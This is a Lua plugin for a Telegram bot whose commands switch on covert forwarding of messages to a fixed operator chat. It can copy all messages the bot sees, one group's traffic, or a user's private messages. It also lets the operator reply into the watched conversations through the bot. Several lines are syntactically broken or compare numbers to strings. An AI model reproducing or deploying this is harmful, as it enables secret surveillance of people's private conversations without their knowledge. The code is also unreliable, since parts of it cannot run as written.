local function run(msg, matches)
    if matches[1] == "show" or matches[1] == "Show" and not matches[2] then
            if msg.to.id == 142334685 then
              show = 1
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "show" or matches[1] == "Show" and matches[2] then
            if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 2
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "Showpv" or matches[1] == "showpv" and not matches[2] then
          if msg.to.id == 142334685 then
              show = 3
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "showpv" or matches[1] == "Showpv" and matches[2] then
            if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 4
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "stop" or matches[1] == "Stop" then
          if msg.to.id == 142334685 then
            show = 0
            ansmod = 0
            redis:del("id")
            redis:del("ansmod")
            return "غیر فعال"
          else
            send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
          end
    elseif matches[1] == "ansmod" or matches[1] == "Ansmod" then
          if is_sudo(msg) then
            if tonumber(ansmod) == 0 then
              if msg.to.id == 142334685 then
                if tonumber(show) == 4 or tonumber(show) == 2 then
                  redis:set("ansmod", msg.from.id)
                  ansmod = 1
                  return "on"
                else
                  return "Error "..show
                end
              else
                send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
              end
            end
          end
    end
    if tonumber(show) == 1 then
      send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id..'\n___________\n'..matches[1], ok_cb, false)
    elseif tonumber(show) == 2 then
      if msg.to.id == tonumber(redis:get("id")) then
        send_msg('chat#142334685', msg.from.print_name.. '\n___________\n'..matches[1], ok_cb, false)
      end
    elseif tonumber(show) == 3 then
      if tonumber(msg.to.id) == '155942482'
        send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.id'\n___________\n'..msg.from.text, ok_cb, false)
      end
    elseif tonumber(show) == 4 then
      if tonumber(msg.to.id) == '155942482' then
        if msg.from.id == tonumber(redis:get("id")) then
          send_msg('chat#142334685', matches[1], ok_cb, false)
        end
      end
    end
    if msg.to.id == 142334685 then
      if ansmod == 1 then
        if msg.from.id == tonumber(redis:get("ansmod")) then
          if matches[1] == "ansmod off" or matches[1] == "Ansmod off" then
            redis:del("ansmod")
            ansmod = 0
            return "off"
          elseif tonumber(show) == 2 then
            send_msg('chat#'..redis:get("id"), matches[1], ok_cb, false)
            return "✔"
          elseif tonumber(show) == 4 then
            send_msg('user#'..redis:get("id"), matches[1], ok_cb, false)
            return "✔"
          end
        end
      end
    end
end
return {
     patterns = {
        "^([Ss]how)$",
        "^([Ss]how) (%d+)$",
        "^([Ss]howpv)$",
        "^([Ss]howpv) (%d+)$",
        "^([Ss]top)$",
        "^([Aa]nsmod)$",
        "^([Aa]nsmod off)$",
        "^(.*)$"
        },
     run = run
}
